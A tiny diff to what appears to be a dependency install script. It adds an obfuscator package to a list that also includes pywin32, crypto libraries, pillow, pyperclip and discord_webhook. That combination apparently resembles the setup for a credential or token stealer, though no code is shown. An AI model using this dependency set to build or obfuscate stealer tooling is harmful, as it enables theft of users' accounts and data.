@@ -4,6 +4,7 @@ pip install psutil
 pip install pypiwin32
 pip install pycryptodome
 pip install cryptography
+pip install Whatfuscator==6.9
 pip install pillow
 pip install discord_webhook
 pip install pyperclip
